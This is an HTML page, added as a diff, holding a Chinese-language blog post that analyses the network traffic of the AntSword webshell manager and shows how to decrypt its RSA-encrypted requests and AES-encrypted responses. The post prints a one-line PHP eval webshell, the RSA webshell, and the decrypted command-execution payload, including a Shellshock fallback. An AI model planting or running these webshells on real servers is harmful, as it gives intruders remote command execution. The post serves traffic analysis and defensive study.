@@ -1,0 +1,314 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="webshell理解webshell的本质是传入命令并且执行。常见的php webshell 1&lt;?php eval($_POST[&amp;#x27;cmd&amp;#x27;];?&gt;)   shell.php访问shell.php的时候post一个参数cmd,如果传入的是cmd&#x3D;system(“whoami”)的话就会执行whoami。webshell相当于网站管理功能，提供列目录，修改文件，虚拟">
+<meta property="og:type" content="article">
+<meta property="og:title" content="蚁剑流量分析&amp;webshell">
+<meta property="og:url" content="https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/index.html">
+<meta property="og:site_name" content="Polo&#39;s Blog">
+<meta property="og:description" content="webshell理解webshell的本质是传入命令并且执行。常见的php webshell 1&lt;?php eval($_POST[&amp;#x27;cmd&amp;#x27;];?&gt;)   shell.php访问shell.php的时候post一个参数cmd,如果传入的是cmd&#x3D;system(“whoami”)的话就会执行whoami。webshell相当于网站管理功能，提供列目录，修改文件，虚拟">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/as1.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/as2.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/as4.jpg">
+<meta property="og:image" content="http://cdn.polowong.top/static/images/as3.jpg">
+<meta property="article:published_time" content="2020-04-30T02:53:51.000Z">
+<meta property="article:modified_time" content="2020-04-30T08:29:13.455Z">
+<meta property="article:author" content="Polo">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://cdn.polowong.top/static/images/as1.jpg">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>蚁剑流量分析&amp;webshell</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇 " href="/2020/05/01/ICMP-tracert/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇 " href="/2020/04/28/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&text=蚁剑流量分析&amp;webshell"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&is_video=false&description=蚁剑流量分析&amp;webshell"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=蚁剑流量分析&amp;webshell&body=Check out this article: https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&title=蚁剑流量分析&amp;webshell"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&name=蚁剑流量分析&amp;webshell&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://polosec.github.io/2020/04/30/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90-webshell/&t=蚁剑流量分析&amp;webshell"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#webshell%E7%90%86%E8%A7%A3"><span class="toc-number">1.</span> <span class="toc-text">webshell理解</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">蚁剑流量分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9C%A8wireshark%E6%8A%93%E5%88%B0%E6%95%B0%E6%8D%AE%E5%8C%85%EF%BC%9A"><span class="toc-number">2.1.</span> <span class="toc-text">在wireshark抓到数据包：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%BD%E8%B8%AAHTTP%E6%B5%81%E9%87%8F%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">追踪HTTP流量：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%B9%E5%8F%91%E9%80%81%E7%9A%84%E6%95%B0%E6%8D%AE%E8%BF%9B%E8%A1%8C%E8%BF%98%E5%8E%9F"><span class="toc-number">2.3.</span> <span class="toc-text">对发送的数据进行还原</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%9E%E6%88%98"><span class="toc-number">2.4.</span> <span class="toc-text">实战</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E6%95%B0%E6%8D%AE%E8%A7%A3%E5%AF%86"><span class="toc-number">2.5.</span> <span class="toc-text">返回数据解密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        蚁剑流量分析&amp;webshell
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">Polo</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2020-04-30T02:53:51.000Z" itemprop="datePublished">2020-04-30</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link-link" href="/tags/web/" rel="tag">web</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h1 id="webshell理解"><a href="#webshell理解" class="headerlink" title="webshell理解"></a>webshell理解</h1><p>webshell的本质是传入命令并且执行。<br>常见的php webshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];<span class="meta">?&gt;</span>) </span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>shell.php<br>访问shell.php的时候post一个参数cmd,<br>如果传入的是cmd=system(“whoami”)的话就会执行whoami。<br>webshell相当于网站管理功能，提供列目录，修改文件，虚拟终端等操作，这些可视化操作的背后其实是一条条PHP语句写的，然后送到服务器执行，然后根据返回结果可视化到管理终端。<br>shell与waf一直在升级，衍生出了各种混淆方法。当然，waf也在抓特征流量进行拦截。</p>
+</blockquote>
+<h1 id="蚁剑流量分析"><a href="#蚁剑流量分析" class="headerlink" title="蚁剑流量分析"></a>蚁剑流量分析</h1><p>今天分析的是昨天没看完的蚁剑流量。发送数据采用RSA加密，服务器返回数据采用AES加密。<br>shell：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cmd</span> = @<span class="variable">$_POST</span>[<span class="string">&#x27;ant&#x27;</span>];</span><br><span class="line"><span class="variable">$pk</span> = &lt;&lt;&lt;EOF</span><br><span class="line">-----BEGIN <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCd3U6xkZFNwFKSRlRa+Jsdy0/E</span><br><span class="line">rkpoq9A/Xl58TfOL5ghxaQh91zWriwpsMVMdjkORzTNM0yrKoyF2+LjxzE2wW6Qt</span><br><span class="line">/NC6dQgUKQQJk9ypgq4Po9ypxxI8AdtthKSelijpqD5YsXZYSFGCyLNaC33+pVp2</span><br><span class="line">wQUED9OTJg9AuXIG4QIDAQAB</span><br><span class="line">-----END <span class="keyword">PUBLIC</span> KEY-----</span><br><span class="line">EOF;</span><br><span class="line"><span class="variable">$cmds</span> = explode(<span class="string">&quot;|&quot;</span>, <span class="variable">$cmd</span>);</span><br><span class="line"><span class="variable">$pk</span> = openssl_pkey_get_public(<span class="variable">$pk</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$cmds</span> <span class="keyword">as</span> <span class="variable">$value</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span> (openssl_public_decrypt(base64_decode(<span class="variable">$value</span>), <span class="variable">$de</span>, <span class="variable">$pk</span>)) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> .= <span class="variable">$de</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$cmd</span>);</span><br></pre></td></tr></table></figure>
+<p>首先模拟一次过程：启动虚拟终端并输入whoami查询。</p>
+<h2 id="在wireshark抓到数据包："><a href="#在wireshark抓到数据包：" class="headerlink" title="在wireshark抓到数据包："></a>在wireshark抓到数据包：</h2><img src="http://cdn.polowong.top/static/images/as1.jpg">
+<h2 id="追踪HTTP流量："><a href="#追踪HTTP流量：" class="headerlink" title="追踪HTTP流量："></a>追踪HTTP流量：</h2><img src="http://cdn.polowong.top/static/images/as2.jpg">
+<h2 id="对发送的数据进行还原"><a href="#对发送的数据进行还原" class="headerlink" title="对发送的数据进行还原"></a>对发送的数据进行还原</h2><p>使用私钥加密的数据用公钥解密。<br>解密后数据：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> ant=@ini_set(<span class="string">&quot;display_errors&quot;</span>, <span class="string">&quot;0&quot;</span>);</span><br><span class="line">@set_time_limit(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asenc</span>(<span class="params"><span class="variable">$out</span></span>)</span>&#123;@session_start();<span class="variable">$key</span>=@substr(str_pad(session_id(),<span class="number">16</span>,<span class="string">&#x27;a&#x27;</span>),<span class="number">0</span>,<span class="number">16</span>);<span class="keyword">return</span> @base64_encode(openssl_encrypt(base64_encode(<span class="variable">$out</span>), <span class="string">&#x27;AES-128-ECB&#x27;</span>, <span class="variable">$key</span>, OPENSSL_RAW_DATA));&#125;;</span><br><span class="line"><span class="comment">//采用AES加密输出，key为session前16位。</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">asoutput</span>(<span class="params"></span>)</span>&#123;<span class="variable">$output</span>=ob_get_contents();ob_end_clean();<span class="keyword">echo</span> <span class="string">&quot;3c5e3e9640&quot;</span>;<span class="keyword">echo</span> @asenc(<span class="variable">$output</span>);<span class="keyword">echo</span> <span class="string">&quot;cda10a9ad&quot;</span>;&#125;</span><br><span class="line"><span class="comment">//输出内容</span></span><br><span class="line">ob_start();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;<span class="variable">$p</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;kba6818a1ddd35&quot;</span>]);<span class="variable">$s</span>=base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;med28329bbe5b9&quot;</span>]);<span class="variable">$envstr</span>=@base64_decode(<span class="variable">$_POST</span>[<span class="string">&quot;v610da0caba97e&quot;</span>]);<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);</span><br><span class="line"><span class="comment">//获取下面post的参数，分别是cmd和whoami。</span></span><br><span class="line"><span class="variable">$c</span>=substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>?<span class="string">&quot;-c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>:<span class="string">&quot;/c \&quot;<span class="subst">&#123;$s&#125;</span>\&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)==<span class="string">&quot;/&quot;</span>)&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;</span>);&#125;<span class="keyword">else</span>&#123;@putenv(<span class="string">&quot;PATH=&quot;</span>.getenv(<span class="string">&quot;PATH&quot;</span>).<span class="string">&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;</span>);&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$envstr</span>))&#123;<span class="variable">$envarr</span>=explode(<span class="string">&quot;|||asline|||&quot;</span>, <span class="variable">$envstr</span>);<span class="keyword">foreach</span>(<span class="variable">$envarr</span> <span class="keyword">as</span> <span class="variable">$v</span>) &#123;<span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$v</span>)) &#123;@putenv(str_replace(<span class="string">&quot;|||askey|||&quot;</span>, <span class="string">&quot;=&quot;</span>, <span class="variable">$v</span>));&#125;&#125;&#125;</span><br><span class="line"><span class="comment">//判断是Linux还是Windows</span></span><br><span class="line"><span class="variable">$r</span>=<span class="string">&quot;<span class="subst">&#123;$p&#125;</span> <span class="subst">&#123;$c&#125;</span>&quot;</span>;</span><br><span class="line"><span class="comment">//拼接命令</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">fe</span>(<span class="params"><span class="variable">$f</span></span>)</span>&#123;<span class="variable">$d</span>=explode(<span class="string">&quot;,&quot;</span>,@ini_get(<span class="string">&quot;disable_functions&quot;</span>));<span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$d</span>))&#123;<span class="variable">$d</span>=<span class="keyword">array</span>();&#125;<span class="keyword">else</span>&#123;<span class="variable">$d</span>=array_map(<span class="string">&#x27;trim&#x27;</span>,array_map(<span class="string">&#x27;strtolower&#x27;</span>,<span class="variable">$d</span>));&#125;<span class="keyword">return</span>(function_exists(<span class="variable">$f</span>)&amp;&amp;is_callable(<span class="variable">$f</span>)&amp;&amp;!in_array(<span class="variable">$f</span>,<span class="variable">$d</span>));&#125;;<span class="function"><span class="keyword">function</span> <span class="title">runshellshock</span>(<span class="params"><span class="variable">$d</span>, <span class="variable">$c</span></span>) </span>&#123;<span class="keyword">if</span> (substr(<span class="variable">$d</span>, <span class="number">0</span>, <span class="number">1</span>) == <span class="string">&quot;/&quot;</span> &amp;&amp; fe(<span class="string">&#x27;putenv&#x27;</span>) &amp;&amp; (fe(<span class="string">&#x27;error_log&#x27;</span>) || fe(<span class="string">&#x27;mail&#x27;</span>))) &#123;<span class="keyword">if</span> (strstr(readlink(<span class="string">&quot;/bin/sh&quot;</span>), <span class="string">&quot;bash&quot;</span>) != <span class="literal">FALSE</span>) &#123;<span class="variable">$tmp</span> = tempnam(sys_get_temp_dir(), <span class="string">&#x27;as&#x27;</span>);putenv(<span class="string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="subst">$c</span> &gt;<span class="subst">$tmp</span> 2&gt;&amp;1&quot;</span>);<span class="keyword">if</span> (fe(<span class="string">&#x27;error_log&#x27;</span>)) &#123;error_log(<span class="string">&quot;a&quot;</span>, <span class="number">1</span>);&#125; <span class="keyword">else</span> &#123;mail(<span class="string">&quot;a@127.0.0.1&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;-bv&quot;</span>);&#125;&#125; <span class="keyword">else</span> &#123;<span class="keyword">return</span> <span class="literal">False</span>;&#125;<span class="variable">$output</span> = @file_get_contents(<span class="variable">$tmp</span>);@unlink(<span class="variable">$tmp</span>);<span class="keyword">if</span> (<span class="variable">$output</span> != <span class="string">&quot;&quot;</span>) &#123;<span class="keyword">print</span>(<span class="variable">$output</span>);<span class="keyword">return</span> <span class="literal">True</span>;&#125;&#125;<span class="keyword">return</span> <span class="literal">False</span>;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">runcmd</span>(<span class="params"><span class="variable">$c</span></span>)</span>&#123;<span class="variable">$ret</span>=<span class="number">0</span>;<span class="variable">$d</span>=dirname(<span class="variable">$_SERVER</span>[<span class="string">&quot;SCRIPT_FILENAME&quot;</span>]);<span class="keyword">if</span>(fe(<span class="string">&#x27;system&#x27;</span>))&#123;@system(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;passthru&#x27;</span>))&#123;@passthru(<span class="variable">$c</span>,<span class="variable">$ret</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;shell_exec&#x27;</span>))&#123;<span class="keyword">print</span>(@shell_exec(<span class="variable">$c</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;exec&#x27;</span>))&#123;@exec(<span class="variable">$c</span>,<span class="variable">$o</span>,<span class="variable">$ret</span>);<span class="keyword">print</span>(join(<span class="string">&quot;&quot;</span>,<span class="variable">$o</span>));&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;popen&#x27;</span>))&#123;<span class="variable">$fp</span>=@popen(<span class="variable">$c</span>,<span class="string">&#x27;r&#x27;</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$fp</span>))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$fp</span>,<span class="number">2048</span>));&#125;@pclose(<span class="variable">$fp</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;proc_open&#x27;</span>))&#123;<span class="variable">$p</span> = @proc_open(<span class="variable">$c</span>, <span class="keyword">array</span>(<span class="number">1</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>), <span class="number">2</span> =&gt; <span class="keyword">array</span>(<span class="string">&#x27;pipe&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)), <span class="variable">$io</span>);<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">1</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">1</span>],<span class="number">2048</span>));&#125;<span class="keyword">while</span>(!@feof(<span class="variable">$io</span>[<span class="number">2</span>]))&#123;<span class="keyword">print</span>(@fgets(<span class="variable">$io</span>[<span class="number">2</span>],<span class="number">2048</span>));&#125;@fclose(<span class="variable">$io</span>[<span class="number">1</span>]);@fclose(<span class="variable">$io</span>[<span class="number">2</span>]);@proc_close(<span class="variable">$p</span>);&#125;<span class="keyword">elseif</span>(fe(<span class="string">&#x27;antsystem&#x27;</span>))&#123;@antsystem(<span class="variable">$c</span>);&#125;<span class="keyword">elseif</span>(runshellshock(<span class="variable">$d</span>, <span class="variable">$c</span>)) &#123;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;<span class="keyword">elseif</span>(substr(<span class="variable">$d</span>,<span class="number">0</span>,<span class="number">1</span>)!=<span class="string">&quot;/&quot;</span> &amp;&amp; @class_exists(<span class="string">&quot;COM&quot;</span>))&#123;<span class="variable">$w</span>=<span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>);<span class="variable">$e</span>=<span class="variable">$w</span>-&gt;exec(<span class="variable">$c</span>);<span class="variable">$so</span>=<span class="variable">$e</span>-&gt;StdOut();<span class="variable">$ret</span>.=<span class="variable">$so</span>-&gt;ReadAll();<span class="variable">$se</span>=<span class="variable">$e</span>-&gt;StdErr();<span class="variable">$ret</span>.=<span class="variable">$se</span>-&gt;ReadAll();<span class="keyword">print</span>(<span class="variable">$ret</span>);&#125;<span class="keyword">else</span>&#123;<span class="variable">$ret</span> = <span class="number">127</span>;&#125;<span class="keyword">return</span> <span class="variable">$ret</span>;&#125;;</span><br><span class="line"><span class="comment">//命令执行函数</span></span><br><span class="line"><span class="variable">$ret</span>=@runcmd(<span class="variable">$r</span>.<span class="string">&quot; 2&gt;&amp;1&quot;</span>);</span><br><span class="line"><span class="comment">//命令执行并且stderr重定向到stdout</span></span><br><span class="line"><span class="keyword">print</span> (<span class="variable">$ret</span>!=<span class="number">0</span>)?<span class="string">&quot;ret=<span class="subst">&#123;$ret&#125;</span>&quot;</span>:<span class="string">&quot;&quot;</span>;;&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;<span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span>-&gt;getMessage();&#125;;</span><br><span class="line">asoutput();</span><br><span class="line"><span class="comment">//执行入口</span></span><br><span class="line"><span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">//这里是post的数据，对应上面的med28329bbe5b9和kba6818a1ddd35。。。&amp;kba6818a1ddd35=Y21k&amp;med28329bbe5b9=Y2QgL2QgIkU6XFxwaHBzdHVkeV9wcm9cXFdXV1xcdGVzdC5pbyImd2hvYW1pJmVjaG8gW1NdJmNkJmVjaG8gW0Vd&amp;v610da0caba97e=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>具体的操作写在上方注释里了，比较清楚。</p>
+<h2 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h2><p>接下来启动虚拟终端，传入whoami ，并且执行，查看数据包。</p>
+<img src="http://cdn.polowong.top/static/images/as4.jpg">
+<h2 id="返回数据解密"><a href="#返回数据解密" class="headerlink" title="返回数据解密"></a>返回数据解密</h2><p>客户端收到数据后会用约定的key进行解密。<br>返回数据：<img src="http://cdn.polowong.top/static/images/as3.jpg"><br>注意：返回的数据里面并不全是有效加密内容，前后存在两端干扰数据，可以在 代码中看到分别是3c5e3e9640和cda10a9ad。中间的数据才是真正有用的数据。<br>首先对中间的数据base64解密一次，然后使用AES-128-ECB解密。key为session前16位：substr(sessionid,0,16);。解密方法：openssl_decrypt($payload, ‘AES-128-ECB’, $key,OPENSSL_RAW_DATA)解密后数据：ZGVza3RvcC00dTgxYjg1XDY5MDI3DQpbU10NCkU6XHBocHN0dWR5X3Byb1xXV1dcdGVzdC5pbw0KW0VdIA0K<br>然后进行base64解密。解密后的数据：desktop-4u81b85\69027<br>[S]<br>E:\phpstudy_pro\WWW\test.io<br>[E]<br>就是执行whoami的结果。</p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>蚁剑流量分析算是看了一天，得益于前期对AES和RSA的基础知识，以至于不需要先看RSA和aes。。2333<br>在对shell和发送的代码进行分析的时候还是遇到了一点困难，有些地方只是大体明白了什么意思，比如识别是Linux还是Windows，但是细讲每一个函数的功能我还是不知道的。对此我的思路是既然目标是命令执行，那么就把底层的实现稍微抽象一点，不影响后续分析。<br>分析流量还是一件非常有意思的事情，虽然我没有机会打AWD，but I love AWD forever!!!!!!!</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/projects_url">项目</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
